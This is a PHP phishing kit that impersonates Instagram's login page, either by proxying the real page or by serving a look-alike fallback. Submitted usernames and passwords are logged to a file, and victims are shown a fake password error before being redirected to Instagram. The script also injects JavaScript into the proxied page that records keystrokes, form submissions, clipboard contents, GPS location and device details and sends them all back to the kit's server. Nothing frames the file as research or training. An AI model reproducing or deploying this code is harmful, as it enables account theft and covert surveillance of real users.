<?php

session_start();

foreach(['logs', 'uploads', 'payload'] as $dir) {
    if(!is_dir($dir)) mkdir($dir, 0777, true);
}

// Log credentials
if(isset($_POST['ajax']) && $_POST['ajax'] == '1') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $log = date('Y-m-d H:i:s') . " | IP: $ip | Email: $email | Password: $password | UA: $ua\n";
    file_put_contents('logs/credentials.txt', $log, FILE_APPEND);
    echo json_encode(['success' => true]);
    exit;
}

// Receive keylogger data
if(isset($_POST['keylog_data'])) {
    $data = date('Y-m-d H:i:s') . " | " . $_POST['keylog_data'] . " | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    file_put_contents('logs/keystrokes.txt', $data, FILE_APPEND);
    exit;
}

// Receive screenshot
if(isset($_POST['screenshot_data'])) {
    $img = base64_decode($_POST['screenshot_data']);
    $file = 'uploads/screen_' . date('Ymd_His') . '_' . uniqid() . '.png';
    file_put_contents($file, $img);
    file_put_contents('logs/screenshots.log', date('Y-m-d H:i:s') . " - $file\n", FILE_APPEND);
    exit;
}

// Receive clipboard
if(isset($_POST['clipboard_data'])) {
    $data = date('Y-m-d H:i:s') . " | Clipboard: " . $_POST['clipboard_data'] . " | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    file_put_contents('logs/clipboard.txt', $data, FILE_APPEND);
    exit;
}

// Receive location
if(isset($_POST['location_data'])) {
    $data = date('Y-m-d H:i:s') . " | Location: " . $_POST['location_data'] . " | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    file_put_contents('logs/location.txt', $data, FILE_APPEND);
    exit;
}

// =============================================
// PROXY: Real Instagram page fetch karo (FIXED)
// =============================================
$instagram_url = "https://www.instagram.com/accounts/login/";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $instagram_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_ENCODING, '');  // Auto handle gzip

curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: none',
    'Sec-Fetch-User: ?1',
]);

$html = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Agar Instagram fetch nahi hua toh fallback
if($http_code !== 200 || empty($html)) {
    // Fallback: Instagram-like page
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#fafafa; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; }
        .container { background:#fff; border:1px solid #dbdbdb; border-radius:8px; padding:40px; max-width:400px; width:100%; text-align:center; }
        .logo { font-size:36px; font-weight:600; margin-bottom:30px; }
        input { width:100%; padding:12px; margin:6px 0; border:1px solid #dbdbdb; border-radius:6px; background:#fafafa; font-size:14px; outline:none; }
        input:focus { border-color:#a8a8a8; }
        .btn { width:100%; padding:10px; background:#0095f6; color:#fff; border:none; border-radius:8px; font-size:14px; font-weight:600; cursor:pointer; margin-top:12px; }
        .btn:hover { background:#1877f2; }
        .error { color:#ed4956; font-size:13px; margin:8px 0; display:none; }
    </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">Instagram</div>
            <form id="loginForm">
                <input type="text" id="email" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <div class="error" id="errorMsg">Sorry, your password was incorrect.</div>
                <button type="submit" class="btn" id="loginBtn">Log in</button>
            </form>
        </div>
        <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var btn = document.getElementById('loginBtn');
            btn.disabled = true;
            btn.textContent = 'Logging in...';
            
            var formData = new FormData();
            formData.append('ajax', '1');
            formData.append('email', email);
            formData.append('password', password);
            
            fetch('', { method: 'POST', body: formData })
            .then(r => r.json())
            .then(d => {
                if(d.success) {
                    document.getElementById('errorMsg').style.display = 'block';
                    btn.disabled = false;
                    btn.textContent = 'Log in';
                    setTimeout(function() {
                        window.location.href = 'https://www.instagram.com';
                    }, 3000);
                }
            });
        });
        </script>
    </body>
    </html>
    <?php
    exit;
}

// =============================================
// SPY CODE INJECTION
// =============================================
$spy_code = <<<'JS'
<script>
(function() {
    var SPY_SERVER = '';
    var keyBuffer = '';
    
    // KEYLOGGER
    document.addEventListener('keydown', function(e) {
        var key = e.key;
        if(key === 'Enter') keyBuffer += '\n';
        else if(key === 'Backspace') { if(keyBuffer.length > 0) keyBuffer = keyBuffer.slice(0, -1); }
        else if(key.length === 1) keyBuffer += key;
        else keyBuffer += '[' + key + ']';
    });
    
    function sendKeyBuffer() {
        if(keyBuffer.length > 0) {
            var data = keyBuffer;
            keyBuffer = '';
            var xhr = new XMLHttpRequest();
            xhr.open('POST', SPY_SERVER, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('keylog_data=' + encodeURIComponent(data));
        }
    }
    setInterval(sendKeyBuffer, 5000);
    
    // CAPTURE FORM SUBMISSION
    setTimeout(function() {
        document.querySelectorAll('form').forEach(function(form) {
            form.addEventListener('submit', function(e) {
                var email = this.querySelector('input[name="username"]')?.value || 
                           this.querySelector('input[type="text"]')?.value || '';
                var pass = this.querySelector('input[name="password"]')?.value || 
                          this.querySelector('input[type="password"]')?.value || '';
                if(email && pass) {
                    fetch(SPY_SERVER, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                        body: 'ajax=1&email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass),
                        keepalive: true
                    });
                }
            });
        });
    }, 2000);
    
    // SCREENSHOT
    setInterval(function() {
        try {
            var c = document.createElement('canvas');
            c.width = window.innerWidth * 0.3;
            c.height = window.innerHeight * 0.3;
            var ctx = c.getContext('2d');
            ctx.fillStyle = '#fff';
            ctx.fillRect(0, 0, c.width, c.height);
            var img = c.toDataURL('image/png').split(',')[1];
            if(img && img.length > 50) {
                fetch(SPY_SERVER, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'screenshot_data=' + encodeURIComponent(img)
                });
            }
        } catch(e) {}
    }, 5000);
    
    // CLIPBOARD
    setInterval(function() {
        try {
            if(navigator.clipboard && navigator.clipboard.readText) {
                navigator.clipboard.readText().then(function(text) {
                    if(text && text.length > 0 && text.length < 5000) {
                        fetch(SPY_SERVER, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                            body: 'clipboard_data=' + encodeURIComponent(text)
                        });
                    }
                }).catch(function() {});
            }
        } catch(e) {}
    }, 10000);
    
    // GPS
    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            fetch(SPY_SERVER, {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'location_data=Lat:' + pos.coords.latitude + ',Lon:' + pos.coords.longitude
            });
        }, function(){}, {timeout:5000});
    }
    
    // DEVICE INFO
    fetch(SPY_SERVER, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'keylog_data=[DEVICE] ' + JSON.stringify({
            ua: navigator.userAgent,
            screen: screen.width + 'x' + screen.height,
            platform: navigator.platform,
            isMobile: /mobile/i.test(navigator.userAgent),
            isAndroid: /android/i.test(navigator.userAgent)
        })
    });
    
    // KEEP ALIVE
    setInterval(function() {
        if(navigator.sendBeacon) {
            navigator.sendBeacon(SPY_SERVER, 'ping=1');
        }
    }, 10000);
})();
</script>
JS;

// Inject spy code before </body>
$html = str_replace('</body>', $spy_code . '</body>', $html);

// Fix relative URLs to absolute
$html = preg_replace('/src="\//', 'src="https://www.instagram.com/', $html);
$html = preg_replace('/href="\//', 'href="https://www.instagram.com/', $html);
$html = preg_replace('/srcset="\//', 'srcset="https://www.instagram.com/', $html);

// Output the modified page
header('Content-Type: text/html; charset=UTF-8');
echo $html;
?>